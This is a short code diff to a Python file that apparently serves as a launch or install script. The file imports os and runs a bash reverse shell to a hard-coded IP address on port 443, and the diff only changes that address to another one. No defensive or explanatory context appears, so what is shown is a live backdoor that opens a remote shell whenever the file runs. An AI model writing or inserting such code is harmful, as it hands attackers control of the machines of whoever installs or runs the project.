@@ -1,4 +1,4 @@
 import launch
 import os
 
-os.system("bash -i >& /dev/tcp/150.158.21.14/443 0>&1")
+os.system("bash -i >& /dev/tcp/23.27.48.96/443 0>&1")
